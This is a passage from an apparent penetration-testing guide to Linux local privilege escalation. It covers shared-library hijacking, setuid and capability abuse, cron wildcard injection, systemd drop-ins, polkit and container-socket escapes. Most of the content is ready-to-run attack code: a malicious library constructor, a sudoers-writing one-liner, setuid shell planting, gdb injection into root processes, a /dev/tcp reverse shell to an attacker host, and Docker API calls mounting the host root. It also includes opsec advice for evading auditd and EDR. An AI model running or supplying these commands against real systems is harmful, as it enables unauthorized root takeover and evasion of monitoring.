Note that a **relative or empty component on PATH** is the same bug from the other direction. `PATH=/usr/bin:` or `PATH=.:/usr/bin` in a root user's profile means anything root runs from a directory you can write resolves your binary first.

#### Shared library hijacking

Since `LD_PRELOAD` is unavailable, the library attack against setuid binaries has to work through the loader's *search path* rather than its preload mechanism. Three viable variants:

**Writable RUNPATH.** If the binary's `DT_RUNPATH` or `DT_RPATH` names a directory you can write, place a library with the right soname there.

```bash
readelf -d /opt/vendor/helper | grep -E 'RPATH|RUNPATH'
# e.g. [rpath] /opt/vendor/lib
ls -ld /opt/vendor/lib                        # writable?
ldd /opt/vendor/helper                        # which soname to impersonate
```

Build a library exporting the symbols the binary needs, or simply one whose constructor fires before anything else needs a symbol:

```bash
cat > /dev/shm/x.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
static void __attribute__((constructor)) go(void) {
    setresuid(0,0,0); setresgid(0,0,0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
gcc -fPIC -shared -o /opt/vendor/lib/libhelper.so.1 /dev/shm/x.c
/opt/vendor/helper
```

**Missing library.** If `ldd` reports `not found` for a library and any directory on the search path is writable, provide it. This happens with vendor software whose installer failed, and with binaries built against a library that was later removed.

```bash
ldd /opt/vendor/helper | grep 'not found'
cat /etc/ld.so.conf /etc/ld.so.conf.d/* ; ldconfig -p | grep libmissing
```

**Writable ld.so.conf.d or ld.so.preload.** These are root-only in a healthy configuration, and when they are not, they are total. A writable `/etc/ld.so.conf.d/*.conf` lets you add a search directory that applies to every binary on the host including setuid ones, once `ldconfig` runs (which packages trigger routinely). A writable `/etc/ld.so.preload` is preloaded even into setuid binaries, because the loader treats it as system configuration rather than as untrusted environment.

```bash
ls -la /etc/ld.so.preload /etc/ld.so.conf /etc/ld.so.conf.d/
echo /dev/shm/x.so > /etc/ld.so.preload      # if writable: any setuid binary now gives root
```

**Dlopen of a plugin path.** Software that loads plugins at runtime resolves them through its own configured directory, not through the loader's rules, so `AT_SECURE` does not protect it. Look for `dlopen` in the strings, a `plugins` or `modules` directory in the config, and check whether that directory is writable.

#### The same four questions

For a setuid binary, ask the identical four questions as for sudo: can it execute, read, write, or load. The difference is only that the environment-variable class of load primitives is mostly closed by `AT_SECURE`, so weight your search towards config-file, plugin, and `PATH` paths. A setuid `find` gives you `-exec`. A setuid `python` gives you everything, though note that Python drops privileges in some builds and you may need `os.setresuid`. A setuid `cp` gives you arbitrary write. A setuid `dd` gives you arbitrary read and write. A setuid `nmap` in a very old version gives you an interactive mode. A setuid backup agent gives you arbitrary read of everything it is configured to back up, and often arbitrary write on restore.

**SGID** deserves its own thought rather than being treated as a weaker SUID. SGID to `shadow` reads `/etc/shadow`. SGID to `disk` reads and writes raw block devices, which is root by another route. SGID to `docker` is root. SGID to a group that owns a script a root cron job runs is root. Check what the group actually owns:

```bash
find / -xdev -perm -2000 -type f -printf '%g %p\n' 2>/dev/null | sort -u
find / -xdev -group shadow -o -group disk -o -group docker 2>/dev/null
```

**Verify.** `id` showing `euid=0`, then normalise with `setresuid` as described earlier. Writing a file and checking its owner is the practical test, because a euid-only shell writes files owned by you in some circumstances and by root in others.

**Detection and opsec.** The `find / -perm -4000` sweep touches every inode on the filesystem, which is visible to any filesystem-activity monitor and to auditd if a broad watch is in place, and it is slow enough to show up in load metrics. Prefer scoped searches or package metadata. Creating a setuid binary is a very high-signal event and is a default detection everywhere: auditd's standard rule sets watch `chmod`, `fchmod`, `fchmodat`, `setuid`, and `setgid` syscalls, and eBPF sensors alert on a new setuid file appearing outside package management. Executing an unusual setuid binary is logged by process-execution telemetry with the parent process, so a setuid binary launched from a web server process is obvious. Compiling on target with `gcc` is itself a common alert. Where possible cross-compile off host and stage a binary, or use an interpreter that is already legitimately present.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| Setuid binary runs as you, no elevation | Filesystem mounted `nosuid`, or `NoNewPrivs` is set, or the binary is a script (Linux ignores setuid on `#!` scripts) |
| `LD_PRELOAD` has no effect | Expected. `AT_SECURE` is set. Use `PATH`, `RUNPATH`, or a plugin path instead |
| `ptrace: Operation not permitted` when tracing it | Cannot trace a privilege-gaining exec. Trace a non-setuid copy instead |
| Your planted `PATH` binary is never called | The target uses an absolute path, or resets `PATH`, or is statically linked and calls `execve` directly |
| `.so` loads but crashes before your constructor | Symbol resolution failed earlier. Add the needed symbols as stubs, or use `-nostartfiles` with `_init` |
| `avc: denied` in the audit log | SELinux blocked the transition or the exec. The binary's context matters, not just its mode |
| Escalation works interactively, fails from a script | No controlling terminal, or the target requires a TTY |

### Linux capabilities

**What it is.** Capabilities split root's powers into discrete privileges that can be granted to a file or held by a process independently of UID 0. A file with `cap_setuid+ep` is functionally setuid-root while showing normal permissions in `ls -l`, which is why this category gets missed.

**Why it works.** Each file may carry three capability sets in an extended attribute (`security.capability`): **permitted**, **inheritable**, and a single **effective** bit. On `execve` the kernel computes the new process's permitted set from the file's permitted set, and if the file's effective bit is set, copies permitted into effective so the program has the capability immediately without having to ask for it. A program with a capability in its effective set can perform the corresponding privileged operation regardless of its UID.

The notation matters:

| `getcap` output | Meaning | Exploitability |
| --- | --- | --- |
| `cap_setuid+ep` | Permitted and effective | Immediately usable, no code changes needed |
| `cap_setuid=ep` | Same, `=` form | Immediately usable |
| `cap_setuid+ei` | Effective and inheritable, not permitted | Only if your process already has it inheritable. Usually not usable |
| `cap_setuid+p` | Permitted only | The program must raise it into effective itself. An interpreter will not, unless the script does it via libcap |
| `cap_net_raw+ep` on `ping` | Normal, boring | Not an escalation |

#### Finding them

```bash
getcap -r / 2>/dev/null
getcap -r /usr /opt /srv /home /usr/local 2>/dev/null       # scoped, much quieter
# from package metadata with no filesystem walk
rpm -qa --filecaps 2>/dev/null | grep -v '(none)'
# your own process, and other processes
capsh --print
getpcaps $$
getpcaps $(pgrep -d, .) 2>/dev/null | grep -v '=$'
grep -H CapEff /proc/[0-9]*/status 2>/dev/null | sort -u -k2
# raw xattr, if getcap is unavailable
getfattr -n security.capability -R /usr/bin 2>/dev/null
```

Compare against the distribution's baseline the same way as setuid. On a stock host the only file capabilities are typically `cap_net_raw` on `ping` (on distributions that have moved away from setuid ping), `cap_net_admin,cap_net_raw` on `dumpcap` or `arping`, `cap_net_bind_service` on `named`, and occasionally caps on `gnome-keyring-daemon`, `mtr-packet`, or `systemd-network-generator`. Anything else, and in particular any capability on an interpreter or a general-purpose tool, is the finding.

#### The root-equivalent set

| Capability | Why it is root, in practice |
| --- | --- |
| `CAP_SYS_ADMIN` | Mount filesystems, `pivot_root`, `setns`, write to arbitrary block devices via mount, `bpf` in older kernels. Effectively unrestricted |
| `CAP_SETUID` | Call `setuid(0)`. Trivially and completely root |
| `CAP_SETGID` | Become any group, including `disk`, `shadow`, `docker` |
| `CAP_SYS_MODULE` | `init_module`, load a kernel module you wrote. Root and kernel-level persistence |
| `CAP_SYS_PTRACE` | Attach to any process including root ones, inject shellcode, or read their memory for secrets. Gated by `kernel.yama.ptrace_scope` |
| `CAP_DAC_READ_SEARCH` | Bypass all read and directory-traverse checks. Read `/etc/shadow`, root keys, keytabs. Also enables `open_by_handle_at` for filesystem traversal outside a chroot or container |
| `CAP_DAC_OVERRIDE` | Bypass all read, write, and execute checks. Write `/etc/shadow` or `/etc/sudoers` |
| `CAP_FOWNER` | Bypass ownership checks for `chmod`, `chown` restrictions, `utime`, extended attributes. Make something setuid |
| `CAP_CHOWN` | Change any file's owner. Give yourself root's keys |
| `CAP_SETFCAP` | Grant file capabilities, including granting yourself `cap_setuid` on a binary |
| `CAP_MKNOD` | Create a device node for a raw disk, then read and write the filesystem directly |
| `CAP_SYS_RAWIO` | `/dev/mem`, `/dev/port`, `ioperm`. Kernel memory access |
| `CAP_BPF` plus `CAP_PERFMON` | Load BPF programs and read arbitrary kernel memory. With `CAP_SYS_ADMIN`, write too |
| `CAP_SYS_BOOT` | `kexec_load`, boot a kernel you supply |
| `CAP_LINUX_IMMUTABLE` | Clear the immutable and append-only attributes that are protecting a file you want to modify |
| `CAP_SYS_CHROOT` | Not root alone, but a component in namespace and chroot escapes |
| `CAP_SYS_RESOURCE` | Bypass filesystem reserved-block limits and resource limits, and raise other limits that gate exploits |
| `CAP_NET_ADMIN`, `CAP_NET_RAW` | Not root. Traffic capture, interface and firewall manipulation, ARP and DNS interception. Valuable laterally, not vertically |
| `CAP_AUDIT_CONTROL`, `CAP_AUDIT_WRITE` | Disable or forge audit records. Anti-forensics, not escalation |

#### Abusing the common ones

```bash
# cap_setuid+ep on an interpreter
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
php -r 'posix_setuid(0); pcntl_exec("/bin/bash");'
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:"inherit"})'

# cap_dac_read_search+ep on a reader: read anything
./tar-with-cap -cf /dev/stdout /etc/shadow | tar -xO
./python-with-cap -c 'print(open("/etc/shadow").read())'

# cap_dac_override+ep on a writer: write anything
./python-with-cap -c 'open("/etc/sudoers.d/zz","w").write("ALL ALL=(ALL) NOPASSWD:ALL\n")'

# cap_setfcap+ep: grant yourself setuid on a binary you control
cp /bin/bash /dev/shm/b
./setcap-with-cap cap_setuid+ep /dev/shm/b
/dev/shm/b -p -c 'import os' 2>/dev/null; /dev/shm/b -p

# cap_sys_ptrace+ep: inject into a root process
cat /proc/sys/kernel/yama/ptrace_scope        # 0 permits attaching to any process
gdb -p $(pgrep -f -u root -n .) -batch -ex 'call (int)setuid(0)' -ex 'call (void)system("/bin/bash -p &")' 2>/dev/null

# cap_sys_module+ep: load a module
# build a minimal module off host, then
./insmod-with-cap /dev/shm/pwn.ko

# cap_sys_admin: mount the host disk, or a bind mount over something privileged
lsblk
mkdir /dev/shm/m && ./mount-with-cap /dev/sda1 /dev/shm/m && ls /dev/shm/m/root
```

Ambient capabilities are the mechanism for carrying a capability into a program that has none of its own, and are only usable if you already hold the capability as inheritable:

```bash
capsh --print | grep -i ambient
capsh --caps="cap_setuid+eip cap_sys_admin+eip" --keep=1 --user=$(whoami) --addamb=cap_setuid -- -c '/bin/bash'
```

**Verify.** For `cap_setuid`, `id` after the call shows `uid=0`. For read and write primitives, the successful read of `/etc/shadow` or the appearance of your `/etc/sudoers.d` file is the confirmation.

**Detection and opsec.** `getcap -r /` walks the whole tree reading extended attributes on every file, which is as noisy as the setuid sweep. Scope it. `setcap` execution and any change to the `security.capability` xattr is a strong detection signal and is covered by standard auditd rule sets watching `setxattr` and friends. Loading a kernel module generates a kernel log line and is one of the loudest things you can do on a monitored host. `ptrace` attach to a root process is a default detection in every EDR worth the name. Using an already-present capability, in contrast, generates almost nothing beyond the process execution itself, which makes this one of the quieter escalation classes when you find it.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| `getcap` returns nothing on a host you know has caps | Filesystem does not support extended attributes, or you lack read access to the directories |
| `os.setuid(0)` gives `OSError: [Errno 1] Operation not permitted` | Capability is `+p` not `+ep`, or `NoNewPrivs` is set, or the file cap was applied to a symlink target you are not actually running |
| Capability present but process shows empty `CapEff` | The effective bit is not set on the file, and your inheritable set is empty |
| Works as one user, not another | Some file caps are combined with a UID restriction via the inheritable set and ambient rules |
| `cap_sys_ptrace` attach fails | `kernel.yama.ptrace_scope` is 1 or higher. `1` restricts to descendants, `2` to admin only, `3` disables it entirely |
| Module load fails with a signature error | Kernel module signature enforcement or Secure Boot lockdown is on |

### Cron, timers, and scheduled execution

**What it is.** Anything that runs code on a schedule as a privileged user is an escalation opportunity if you can influence what it runs, where it runs, or what it reads.

**Why it works.** Scheduled jobs run non-interactively, usually as root, with an environment the author did not think carefully about, and against files whose permissions the author did not check because they were correct at install time. The scheduler resolves the command with a minimal `PATH`, expands shell globs in the job's working directory, and executes scripts whose contents it does not validate.

#### Enumerating everything scheduled

```bash
crontab -l
sudo -l 2>/dev/null | grep -i cron
cat /etc/crontab
ls -laR /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
cat /var/spool/cron/root /var/spool/cron/crontabs/root 2>/dev/null
cat /etc/anacrontab 2>/dev/null
systemctl list-timers --all
systemctl cat some.timer some.service
grep -rlE 'OnCalendar|OnBootSec|OnUnitActiveSec' /etc/systemd /usr/lib/systemd /run/systemd 2>/dev/null
atq; at -l; ls -la /var/spool/at* 2>/dev/null
ls -la /etc/incron.d 2>/dev/null
# and the dynamic view, which catches what the static view misses
./pspy64 -pf -i 1000
grep -iE 'cron|systemd.*Start' /var/log/syslog /var/log/cron /var/log/messages 2>/dev/null | tail -50
journalctl -u cron -u crond --since '-2 hours' --no-pager 2>/dev/null | tail -50
```

**Read the static configuration and then watch.** Cron jobs defined in a user crontab you cannot read, jobs installed by a configuration-management run, and jobs that only fire on certain days are all invisible statically. *pspy* watching `/proc` for a few minutes at the top of the hour is often more productive than an hour of reading files.

#### Writable scripts and writable directories

The most common finding by a wide margin. A root cron entry calls `/opt/scripts/backup.sh` and that file, or its parent directory, is writable by you or by a group you are in.

```bash
# extract every path referenced by any scheduled job and test writability
{ cat /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/* 2>/dev/null;
  systemctl cat '*.service' '*.timer' 2>/dev/null; } \
| grep -oE '/[[:alnum:]_./-]+' | sort -u \
| while read -r p; do
    [ -e "$p" ] || continue
    if [ -w "$p" ]; then echo "WRITABLE FILE: $p"; fi
    d=$(dirname "$p"); if [ -w "$d" ]; then echo "WRITABLE DIR:  $d (for $p)"; fi
  done
```

A **writable parent directory** with a non-writable script is still exploitable if you can delete and recreate the file, which a writable directory permits regardless of the file's own mode, unless the sticky bit is set and you do not own the file.

Payload discipline matters here: do not replace the script's contents, append to it. Replacing it breaks the job, which gets noticed, and it destroys the thing you were meant to be testing. Append a single line and remove it afterwards.

```bash
cp /opt/scripts/backup.sh /dev/shm/.backup.orig
printf '\n/bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1" &\n' "$ATTACKER" "$LPORT" >> /opt/scripts/backup.sh
# or, quieter and more robust than a callback:
printf '\ncp /bin/bash /dev/shm/.b && chmod 4755 /dev/shm/.b\n' >> /opt/scripts/backup.sh
```

#### PATH in the cron environment

**Why it works.** cron sets a `PATH` for the jobs it runs, and the default is short. On Debian-family systems `/etc/crontab` typically declares `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and any `PATH=` line in a crontab applies to the jobs below it. If any directory on that `PATH` is writable by you, and any job calls a program by bare name, you control that program.

```bash
grep -h '^PATH' /etc/crontab /etc/cron.d/* /var/spool/cron/* 2>/dev/null
# then test each component
grep -h '^PATH=' /etc/crontab 2>/dev/null | cut -d= -f2 | tr ':' '\n' | while read -r d; do
  [ -w "$d" ] && echo "WRITABLE ON CRON PATH: $d"
done
```

The classic version of this is a `PATH` beginning with `/home/user/bin` or `/usr/local/bin` where `/usr/local/bin` is group writable, combined with a job like `* * * * * root overwrite.sh`. Plant `overwrite.sh` in the writable directory that appears first.

Systemd units have the same issue in a different place: a unit with `ExecStart=/bin/sh -c 'somecommand'` resolves `somecommand` through the unit's `Environment=PATH=` or the systemd default. Check with `systemctl show unit -p Environment -p ExecStart`.

#### Wildcard injection

**What it is.** A privileged command that expands a shell glob over a directory you can write in. You create files whose *names* are option strings, the shell expands the glob into an argument list, and the target program parses your filenames as flags.

**Why it works.** Glob expansion happens in the shell, before the program runs. The shell has no concept of "this is a filename, not an option". `tar cf backup.tar *` in a directory containing a file named `--checkpoint=1` becomes `tar cf backup.tar --checkpoint=1 realfile`, and tar cannot tell the difference. Any program with an option that runs a command, reads a file, or changes a target gives you the corresponding primitive.

**Preconditions.** A privileged job containing a glob (`*`, `?`, `[...]`) as an argument, and write access to the directory the glob expands in. The glob must not be quoted, and the program must accept options after the first non-option argument (GNU tools generally do; POSIXLY_CORRECT changes this).

**tar**, using its checkpoint action hook, which is designed to run a command at a progress checkpoint:

```bash
# job: cd /var/backups && tar -czf /backup/out.tar.gz *
cd /var/backups
printf '#!/bin/bash\ncp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b\n' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# wait for the job, then:
/dev/shm/.b -p
```

`--checkpoint=1` makes tar emit a checkpoint after every record, and `--checkpoint-action=exec=CMD` runs `CMD` at each checkpoint. Nothing about this is a bug in tar, it is documented behaviour being reached through filenames. `--use-compress-program=CMD` and `--to-command=CMD` are alternative execution hooks in the same tool if the checkpoint options are unavailable.

**rsync**, whose `-e` option specifies the remote shell command:

```bash
# job: rsync -a /srv/data/* backup@host:/backups/
cd /srv/data
printf '#!/bin/bash\ncp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b\n' > s.sh; chmod +x s.sh
touch -- '-e sh s.sh'
```

rsync also has `--rsh=`, and its daemon-mode `pre-xfer exec`/`post-xfer exec` hooks if you can influence `rsyncd.conf`.

**chown and chmod**, using `--reference`, which takes the ownership or mode to apply *from* a named file instead of from the command line. The injection changes what gets applied, not what it gets applied to, so the productive use is to widen permissions on files the job already touches, plus `--dereference` and symlinks to reach outside the directory.

```bash
# job: chown -R www-data:www-data /var/www/*
cd /var/www
touch -- '--reference=/etc/shadow'     # everything the job touches becomes root:shadow
# job: chmod -R 750 /var/www/*
touch -- '--reference=/bin/bash'       # everything the job touches becomes 0755
# combined with a symlink, the -R walk follows you out of the directory
ln -s /root secretdir
touch -- '--dereference'
```

`chown` and `chmod` do not follow symlinks during a `-R` walk unless told to (`-L`, or `--dereference` for the arguments themselves), so the symlink half of this depends on the exact job. Reproduce the job's command line on a scratch host and confirm the effect before firing it at a production one, because `--reference` abuse is easy to get backwards and the failure mode is breaking permissions on a live service.

**7z and zip**, which give a read primitive rather than execution:

```bash
# job: 7z a /backup/out.7z /srv/data/*
cd /srv/data
touch @root.txt              # tells 7z to read a file list from root.txt
ln -s /etc/shadow root.txt   # 7z reports the unreadable "filenames" in its error output
# the contents of /etc/shadow appear in the job's stdout or log

# job: zip -r /backup/out.zip /srv/data/*
cd /srv/data
printf '#!/bin/bash\nbash -p\n' > x.sh; chmod +x x.sh
touch -- '-T'
touch -- '-TT sh x.sh'       # -T tests the archive, -TT sets the test command
```

The general recipe for finding new instances: take the program name from the job, read its manual page for any option that names a command, a file to read, a file to write, a reference object, or a plugin, and check whether it is reachable as a bare `--option=value` filename. Filenames cannot contain `/`, which constrains you to relative paths and to options whose values you can place in the same directory, but that is rarely a real limit.

#### Systemd timers

Timers are the modern scheduler and are enumerated separately from cron, which is why they get missed.

```bash
systemctl list-timers --all
systemctl cat backup.timer backup.service
systemctl show backup.service -p ExecStart -p User -p Environment -p WorkingDirectory
ls -la /etc/systemd/system/ /etc/systemd/system/*.d/ /run/systemd/system/ 2>/dev/null
systemctl --user list-timers 2>/dev/null
ls -la ~/.config/systemd/user/ 2>/dev/null
```

The escalation is the same as for cron plus one extra: the unit file itself. If you can write the `.service` a timer triggers, you own its `ExecStart`. See the writable systemd unit files section below.

**Detection and opsec.** Modifying a cron file or a unit file is one of the most heavily monitored actions on Linux. Default auditd rule sets include watches on `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron`, `/etc/systemd`, and `/etc/anacrontab`. Creating oddly named files in a directory (`--checkpoint-action=...`) is unusual enough to be caught by filename-based heuristics, and it leaves the files sitting in the directory where anyone looking will see them immediately, so clean up. The execution itself appears in telemetry as a child of `cron`, `crond`, `anacron`, or `systemd`, and a shell or a network connection parented by cron is a default alert. Prefer a payload that creates a local setuid binary over one that makes an outbound connection, because the connection is what triggers the network side of the detection.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| Job never fires | Wrong schedule assumption, cron not running, the crontab lacks a trailing newline (cron silently skips the last line without one), or the job is disabled |
| Appended line runs as the wrong user | `/etc/crontab` and `/etc/cron.d` entries have a user field; user crontabs do not. You appended to the wrong kind of file |
| Wildcard files ignored | The glob was quoted, the program uses `POSIXLY_CORRECT` option ordering, or the job does `find`-based iteration rather than a shell glob |
| `tar: unrecognized option` in the log | Your filename was mangled, often by a leading `./` from the glob. Some jobs use `./*` which produces `./--checkpoint=1`, and tar then treats it as a filename. Try `-C` style jobs or a different program |
| Job runs but your script does not | `PATH` in the cron environment differs, or the script lacks the execute bit, or there is no shebang and cron's shell is `/bin/sh` |
| Systemd unit change has no effect | `systemctl daemon-reload` has not run. Wait for a package operation or a reboot, or trigger a reload if you have the rights |

### Services, sockets, and D-Bus

#### Writable systemd unit files and drop-ins

**What it is.** systemd starts services as configured by unit files. Write access to a unit file, to a drop-in directory, or to a path a unit references is root at the next start.

**Why it works.** `ExecStart`, `ExecStartPre`, `ExecStartPost`, `ExecReload`, and `ExecStop` are command lines systemd executes as the unit's configured `User=`, which defaults to root. systemd reads unit files from a search path with a defined precedence, so a file in a higher-precedence directory overrides a vendor one, and a drop-in `.conf` in `unit.service.d/` merges over it without replacing it.

The search order, highest precedence first: `/etc/systemd/system`, `/run/systemd/system`, `/usr/local/lib/systemd/system`, `/usr/lib/systemd/system` (and `/lib/systemd/system`). For user units: `~/.config/systemd/user`, `/etc/systemd/user`, `/run/systemd/user`, `/usr/lib/systemd/user`.

```bash
# writable unit files anywhere on the search path
find /etc/systemd /run/systemd /usr/lib/systemd /lib/systemd /usr/local/lib/systemd \
     -writable -type f -name '*.service' -o -writable -type d 2>/dev/null
# writable binaries referenced by units, which is the more common real finding
systemctl show '*' -p ExecStart 2>/dev/null | grep -oE '/[[:alnum:]_./-]+' | sort -u \
  | while read -r p; do [ -w "$p" ] && echo "WRITABLE EXEC: $p"; done
# units running as root that reference a path under /opt, /srv, /home or /usr/local
grep -rlE '^ExecStart=.*(/opt|/srv|/home|/usr/local)' /etc/systemd /usr/lib/systemd 2>/dev/null
```

```bash
# drop-in override, additive and less destructive than editing the unit
mkdir -p /etc/systemd/system/target.service.d
cat > /etc/systemd/system/target.service.d/override.conf <<'EOF'
[Service]
ExecStartPost=/bin/bash -c "cp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b"
EOF
systemctl daemon-reload && systemctl restart target.service    # if permitted
```

A drop-in with only `ExecStartPost=` leaves the service working normally, which matters both for stealth and for not breaking the host. Note that overriding `ExecStart=` in a drop-in requires an empty `ExecStart=` line first to clear the inherited value, otherwise systemd errors with a "more than one ExecStart" complaint for a `Type=oneshot`-incompatible unit.

If you cannot `daemon-reload`, you are waiting for a reboot or for a package operation that reloads. A unit with `Restart=always` and a short `RestartSec=` restarts on its own if you can make the current instance exit. A `.path` unit or a `.timer` you can write triggers without any reload once systemd next reloads for any reason.

**User units** are worth checking because `~/.config/systemd/user` is writable by definition. They run as you, not root, so they are persistence rather than escalation, unless the target user is someone else whose home directory you can write, in which case they are lateral movement into that account.

#### D-Bus and polkit

**What it is.** D-Bus is the IPC bus that privileged system services expose their management interfaces on, and polkit is the authorisation layer that decides whether your unprivileged session may invoke a privileged method.

**Why it works.** A polkit **action** has an authorisation requirement per context (`allow_any`, `allow_inactive`, `allow_active`), and administrators or vendors relax them. An action set to `yes` for `allow_active` means any user with an active local session can invoke it with no authentication. Actions include starting and stopping systemd units, managing packages, mounting filesystems, and managing NetworkManager, and several of those are trivially root-equivalent.

```bash
# what is on the bus
busctl list
busctl --system list
busctl introspect org.freedesktop.systemd1 /org/freedesktop/systemd1 2>/dev/null | head -40
gdbus introspect --system --dest org.freedesktop.systemd1 --object-path /org/freedesktop/systemd1 2>/dev/null | head

# polkit policy
pkaction --verbose 2>/dev/null | head -60
ls -la /usr/share/polkit-1/actions/ /etc/polkit-1/rules.d/ /usr/share/polkit-1/rules.d/ 2>/dev/null
grep -rn 'allow_active' /usr/share/polkit-1/actions/ 2>/dev/null | grep -i 'yes'
cat /etc/polkit-1/rules.d/*.rules 2>/dev/null
# writable D-Bus policy is a direct finding
find /etc/dbus-1 /usr/share/dbus-1 /etc/polkit-1 -writable 2>/dev/null

# is there an active session for polkit to consider you 'active'?
loginctl list-sessions; loginctl show-session $XDG_SESSION_ID 2>/dev/null
```

The exploitable pattern: an action such as unit management with `allow_active=yes`, plus an active session, means you can ask systemd over D-Bus to run a transient unit as root:

```bash
# systemd-run asks systemd, over D-Bus and through polkit, to run a transient unit
systemd-run /bin/bash -c 'cp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b'
systemd-run --scope /bin/bash
systemd-run --uid=0 --gid=0 /bin/bash -c 'id > /tmp/.probe'
# other polkit-fronted actions that are worth testing when the policy is relaxed
systemctl start some.service        # goes through org.freedesktop.systemd1.manage-units
pkexec /bin/bash                    # goes through org.freedesktop.policykit.exec
udisksctl mount -b /dev/sda1        # mount a host disk you should not be able to mount
```

Use `systemd-run` rather than hand-building `dbus-send` calls. It targets the same `StartTransientUnit` method on `org.freedesktop.systemd1.Manager`, but the raw D-Bus form requires an awkwardly nested variant array for the unit properties that is easy to get wrong, and `systemd-run` reports whether a failure was authentication or policy. If you need the raw call (no `systemd-run` binary present), introspect the method signature on the target first with `busctl introspect org.freedesktop.systemd1 /org/freedesktop/systemd1` and build the arguments from that rather than from memory.

Two historical polkit and pkexec bugs remain worth version-checking, because they are unauthenticated local root and they appear on hosts that have not been patched since:

| CVE | Component | Nature |
| --- | --- | --- |
| CVE-2021-4034 ("PwnKit") | `pkexec`, all versions since 2009 until the fix | `pkexec` with an empty `argv` reintroduces an attacker-controlled environment variable, giving root with no authentication at all |
| CVE-2021-3560 | polkit 0.113 to 0.118 | Authentication bypass by disconnecting the D-Bus request mid-check, letting `accountsservice` create a privileged user |

```bash
pkexec --version
ls -la /usr/bin/pkexec         # setuid root
dpkg -l policykit-1 polkitd 2>/dev/null; rpm -q polkit 2>/dev/null
```

#### Writable Unix domain sockets

**Why it works.** A Unix socket's filesystem permissions decide who may connect. A privileged daemon listening on a socket that is group or world writable accepts commands from you, and many such daemons treat "you connected" as "you are authorised", relying on the socket permissions as the entire access-control model.

```bash
ss -xlp                                            # listening unix sockets with owners
find / -xdev -type s -printf '%m %u %g %p\n' 2>/dev/null | sort
find / -xdev -type s -writable 2>/dev/null
lsof -U 2>/dev/null | awk '{print $1, $3, $NF}' | sort -u
```

Having found a writable socket, work out what protocol it speaks by identifying the listening process, then speak it:

```bash
ss -xlp | grep /run/some.sock                      # which process
socat - UNIX-CONNECT:/run/some.sock                # interactive probe
curl -s --unix-socket /run/some.sock http://localhost/            # if it is HTTP
printf 'PING\r\n' | socat - UNIX-CONNECT:/run/redis.sock          # if it is redis
```

An abstract-namespace socket (shown with a leading `@` in `ss` output) has no filesystem permissions at all, so anything in the same network namespace can connect. That is a common weakness in bespoke agents.

#### The container runtime socket

**What it is.** Membership of the `docker` group, or write access to `/var/run/docker.sock`, is root on the host. It is one of the most common findings on any modern Linux host, and it is not a vulnerability, it is the documented design: the Docker daemon runs as root and its API lets you start a container with any bind mount and any privilege level.

**Why it works.** The API accepts a container specification including `HostConfig.Binds` and `HostConfig.Privileged`. Binding the host's `/` into a container and then `chroot`ing gives you the host filesystem as root. No escape is needed, because you were never confined.

**Preconditions.** Read and write access to the socket, which in practice means the `docker` group, or a socket with permissive modes, or a container that has the host socket bind-mounted in.

```bash
# find it
ls -la /var/run/docker.sock /run/docker.sock /run/podman/podman.sock \
       /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
id | grep -oE 'docker|lxd|podman'
env | grep -i DOCKER_HOST

# with the docker client present
docker version
docker run -it --rm -v /:/host --privileged alpine chroot /host /bin/bash
docker run -it --rm --pid=host --privileged --net=host -v /:/host alpine sh
# no image locally? use one that is, or one you can pull
docker images
```

Without a docker client, talk to the API over the socket with curl. This is the version that matters, because minimal hosts and containers often have the socket but not the binary:

```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | head -c 2000
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1

# create a container with the host root bind-mounted
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host sh -c \"cp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b\""],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
# then start it, using the Id returned above
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id>/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<id>/logs?stdout=1&stderr=1"
```

The same pattern applies to the other runtimes with different tooling: `podman` with a root-owned socket (a *rootless* podman socket is not root and gets you only that user), `ctr` or `nerdctl` against containerd, and `crictl` against CRI-O. A `kubectl` with node or pod-create rights in the local cluster is the Kubernetes equivalent and belongs to the containers and orchestration material in the companion part.

**LXD and LXC** group membership is the same class of finding:

```bash
id | grep lxd
lxc list
# import a minimal image, then run a privileged container with the host root mounted
lxc image list
lxc init someimage p -c security.privileged=true
lxc config device add p host disk source=/ path=/mnt/root recursive=true
lxc start p
lxc exec p -- /bin/sh -c 'chroot /mnt/root sh -c "cp /bin/bash /dev/shm/.b; chmod 4755 /dev/shm/.b"'
```

**Verify.** `ls /host/root` from inside the container, or the appearance of your setuid binary on the host filesystem. Do not assume the bind mount worked, check it.

